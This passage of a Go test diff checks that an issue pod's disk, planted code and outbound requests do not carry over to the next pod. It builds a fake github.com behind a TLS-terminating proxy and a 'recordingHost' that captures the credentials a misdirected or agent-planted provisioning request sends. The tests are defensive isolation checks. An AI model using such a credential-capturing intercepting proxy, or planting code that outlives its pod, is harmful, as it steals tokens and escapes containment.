+			// The issue's next pod, once the first is gone, on a disk of its own.
+			ran = len(rig.sunk())
+			if rig.host != nil {
+				reached = rig.host.requests()
+			}
+			rig.delete(first)
+			next, err := rig.start(rig.launch(workerSpec(t)))
+			if err != nil {
+				t.Errorf("the issue's next pod, on a fresh disk: %v", err)
+			}
+			if len(next.inherited) != 0 {
+				t.Errorf("the issue's next pod started on a disk holding %v, which its first pod wrote: an issue pod's disk is its own", next.inherited)
+			}
+			if sunk := rig.sunk(); len(sunk) != ran {
+				t.Errorf("planted code ran in the issue's next pod, which no file of its first pod's disk reaches: %q", sunk[ran:])
+			}
+			if rig.host != nil && rig.host.requests() != reached {
+				t.Errorf("the host the first pod's plant named heard from the issue's next pod (%d requests)", rig.host.requests()-reached)
+			}
+			rig.holdsNoCanary("the next pod's disk", next.disk)
+		})
+	}
+}
+
+// gitHubStandIn is github.com as a pod reaches it: through the cluster's egress proxy, which
+// tunnels CONNECT github.com:443 to a TLS server whose certificate the stand-in's CA signed. It
+// serves boundaryRepo over git's smart HTTP to a request authenticated as x-access-token with
+// canaryToken, and challenges every other request.
+type gitHubStandIn struct {
+	proxy  *httptest.Server
+	caFile string
+	// remote is the bare repository the stand-in serves as boundaryRepo.
+	remote string
+	mu     sync.Mutex
+	count  int
+}
+
+func newGitHubStandIn(t *testing.T, root string) *gitHubStandIn {
+	t.Helper()
+	projects := filepath.Join(root, "github")
+	remote := filepath.Join(projects, boundaryRepo)
+	seed := filepath.Join(root, "seed")
+	git, err := exec.LookPath("git")
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, argv := range [][]string{
+		{"init", "--quiet", "--bare", "--initial-branch=main", remote},
+		{"init", "--quiet", "--initial-branch=main", seed},
+		{"-C", seed, "-c", "user.name=Legion test", "-c", "user.email=legion-test@example.invalid", "commit", "--quiet", "--allow-empty", "-m", "seed"},
+		{"-C", seed, "push", "--quiet", remote, "HEAD:main"},
+	} {
+		command := exec.Command(git, argv...)
+		command.Dir = root
+		command.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1")
+		if output, err := command.CombinedOutput(); err != nil {
+			t.Fatalf("git %s: %v\n%s", strings.Join(argv, " "), err, output)
+		}
+	}
+	ca, caKey, caPEM := newCertificateAuthority(t)
+	caFile := filepath.Join(root, "github-ca.pem")
+	if err := os.WriteFile(caFile, caPEM, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	g := &gitHubStandIn{caFile: caFile, remote: remote}
+	backend := &cgi.Handler{
+		Path: git, Args: []string{"http-backend"},
+		Env: []string{"GIT_PROJECT_ROOT=" + projects, "GIT_HTTP_EXPORT_ALL=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1"},
+	}
+	g.proxy = tlsTerminatingProxy(t, leafCertificate(t, ca, caKey), func(w http.ResponseWriter, r *http.Request) {
+		if user, password, ok := r.BasicAuth(); !ok || user != "x-access-token" || password != canaryToken {
+			w.Header().Set("WWW-Authenticate", `Basic realm="GitHub"`)
+			w.WriteHeader(http.StatusUnauthorized)
+			return
+		}
+		g.mu.Lock()
+		g.count++
+		g.mu.Unlock()
+		backend.ServeHTTP(w, r)
+	}, nil)
+	return g
+}
+
+// boundaryCacheToken is the bearer token the rig's Secret projections hold for the repository
+// cache, and the one the stand-in cache takes.
+const boundaryCacheToken = "the-repository-cache-token"
+
+// newCacheStandIn is the repository cache of boundaryRepo as an issue pod's fetch reaches it at
+// the address the runtime names: its /healthz answers any request, its /tar only the bearer
+// boundaryCacheToken, it names sjawhar/legion-smoke on every answer it gives, is ready at once, and
+// streams as its /tar the refs and packs (workspace.FeedEntry) of a bare clone of remote as it is
+// when asked.
+func newCacheStandIn(t *testing.T, remote string) *httptest.Server {
+	t.Helper()
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/healthz":
+			w.Header().Set(workspace.CacheRepositoryHeader, "sjawhar/legion-smoke")
+			_, _ = w.Write([]byte(`{"ready":true,"repo":"sjawhar/legion-smoke","bytes":1}`))
+		case "/tar":
+			if r.Header.Get("Authorization") != "Bearer "+boundaryCacheToken {
+				http.Error(w, "the repository cache's token is required", http.StatusUnauthorized)
+				return
+			}
+			body, err := feedTar(remote)
+			if err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			w.Header().Set(workspace.CacheRepositoryHeader, "sjawhar/legion-smoke")
+			_, _ = w.Write(body)
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	t.Cleanup(server.Close)
+	return server
+}
+
+// feedTar is a tar stream of the refs and packs of a bare clone of remote, as the repository
+// cache streams its own.
+func feedTar(remote string) ([]byte, error) {
+	dir, err := os.MkdirTemp("", "boundary-cache-")
+	if err != nil {
+		return nil, err
+	}
+	defer func() { _ = os.RemoveAll(dir) }()
+	clone := filepath.Join(dir, "clone.git")
+	command := exec.Command("git", "clone", "--bare", "--quiet", "--no-local", remote, clone)
+	command.Dir = dir
+	command.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1")
+	if output, err := command.CombinedOutput(); err != nil {
+		return nil, fmt.Errorf("clone %s: %w\n%s", remote, err, output)
+	}
+	var stream bytes.Buffer
+	archive := tar.NewWriter(&stream)
+	err = filepath.WalkDir(clone, func(path string, entry fs.DirEntry, err error) error {
+		if err != nil || path == clone {
+			return err
+		}
+		relative, err := filepath.Rel(clone, path)
+		if err != nil {
+			return err
+		}
+		name := filepath.ToSlash(relative)
+		if !workspace.FeedEntry(name, entry.IsDir()) {
+			if entry.IsDir() {
+				return filepath.SkipDir
+			}
+			return nil
+		}
+		info, err := entry.Info()
+		if err != nil {
+			return err
+		}
+		header, err := tar.FileInfoHeader(info, "")
+		if err != nil {
+			return err
+		}
+		header.Name = name
+		if entry.IsDir() {
+			header.Name += "/"
+			return archive.WriteHeader(header)
+		}
+		body, err := os.ReadFile(path)
+		if err == nil {
+			err = archive.WriteHeader(header)
+		}
+		if err == nil {
+			_, err = archive.Write(body)
+		}
+		return err
+	})
+	if err == nil {
+		err = archive.Close()
+	}
+	return stream.Bytes(), err
+}
+
+// authorized is how many requests presented the provisioning token.
+func (g *gitHubStandIn) authorized() int {
+	g.mu.Lock()
+	defer g.mu.Unlock()
+	return g.count
+}
+
+// recordingHost is a server a tree agent points provisioning at: a TLS host of its own, or an
+// http.proxy that terminates TLS for whatever host the client asked to CONNECT to, with a
+// certificate no trust store holds. It records every request and the credentials each carried,
+// and challenges for more.
+type recordingHost struct {
+	server *httptest.Server
+	mu     sync.Mutex
+	seen   int
+	creds  []string
+}
+
+func newRecordingHost(t *testing.T, proxy bool) *recordingHost {
+	t.Helper()
+	h := &recordingHost{}
+	handler := func(w http.ResponseWriter, r *http.Request) {
+		h.mu.Lock()
+		h.seen++
+		if authorization := r.Header.Get("Authorization"); authorization != "" {
+			decoded, _ := base64.StdEncoding.DecodeString(strings.TrimPrefix(authorization, "Basic "))
+			h.creds = append(h.creds, string(decoded))
+		}
+		h.mu.Unlock()
+		w.Header().Set("WWW-Authenticate", `Basic realm="planted"`)
+		w.WriteHeader(http.StatusUnauthorized)
+	}
+	if proxy {
+		ca, caKey, _ := newCertificateAuthority(t)
+		h.server = tlsTerminatingProxy(t, leafCertificate(t, ca, caKey), handler, func() {
+			h.mu.Lock()
+			h.seen++
+			h.mu.Unlock()
+		})
+	} else {
+		h.server = httptest.NewTLSServer(http.HandlerFunc(handler))
+		t.Cleanup(h.server.Close)
+	}
+	return h
+}
+
+func (h *recordingHost) requests() int {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+	return h.seen
+}
+
+func (h *recordingHost) credentials() []string {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+	return slices.Clone(h.creds)
+}
+
+// tlsTerminatingProxy is an HTTP proxy that answers every CONNECT itself: it terminates TLS with
+// certificate and serves handler on the tunnel. onConnect, when set, runs for each CONNECT.
+func tlsTerminatingProxy(t *testing.T, certificate tls.Certificate, handler http.HandlerFunc, onConnect func()) *httptest.Server {
+	t.Helper()
+	tunnels := &tunnelListener{conns: make(chan net.Conn), done: make(chan struct{})}
+	inner := &http.Server{Handler: handler, ReadHeaderTimeout: 30 * time.Second}
+	go func() { _ = inner.Serve(tunnels) }()
+	proxy := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodConnect {
+			http.Error(w, "CONNECT only", http.StatusMethodNotAllowed)
+			return
+		}
+		if onConnect != nil {
+			onConnect()
+		}
+		conn, _, err := w.(http.Hijacker).Hijack()
+		if err != nil {
+			return
+		}
+		if _, err := conn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n")); err != nil {
+			_ = conn.Close()
+			return
+		}
+		select {
+		case tunnels.conns <- tls.Server(conn, &tls.Config{Certificates: []tls.Certificate{certificate}}):
+		case <-tunnels.done:
+			_ = conn.Close()
+		}
+	}))
+	t.Cleanup(func() {
+		proxy.Close()
+		_ = inner.Close()
+	})
+	return proxy
+}
+
+// tunnelListener hands the proxy's tunnels to an http.Server as accepted connections.
+type tunnelListener struct {
+	conns chan net.Conn
+	done  chan struct{}
+	once  sync.Once
+}
+
+func (l *tunnelListener) Accept() (net.Conn, error) {
+	select {
+	case conn := <-l.conns:
+		return conn, nil
+	case <-l.done:
+		return nil, net.ErrClosed
+	}
+}
+
+func (l *tunnelListener) Close() error {
+	l.once.Do(func() { close(l.done) })
+	return nil
+}
+
+func (l *tunnelListener) Addr() net.Addr { return &net.TCPAddr{IP: net.IPv4(127, 0, 0, 1)} }
+
+func newCertificateAuthority(t *testing.T) (*x509.Certificate, *ecdsa.PrivateKey, []byte) {
+	t.Helper()
+	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	template := &x509.Certificate{
+		SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "Legion test CA"},
+		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
+		IsCA: true, BasicConstraintsValid: true, KeyUsage: x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
+	}
+	der, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
+	if err != nil {
+		t.Fatal(err)
+	}
+	ca, err := x509.ParseCertificate(der)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return ca, key, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
+}
+
+// leafCertificate is a server certificate for github.com that ca signed.
+func leafCertificate(t *testing.T, ca *x509.Certificate, caKey *ecdsa.PrivateKey) tls.Certificate {
+	t.Helper()
+	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	template := &x509.Certificate{
+		SerialNumber: big.NewInt(2), Subject: pkix.Name{CommonName: "github.com"}, DNSNames: []string{"github.com"},
+		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
+		KeyUsage: x509.KeyUsageDigitalSignature, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	}
+	der, err := x509.CreateCertificate(rand.Reader, template, ca, &key.PublicKey, caKey)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}
+}
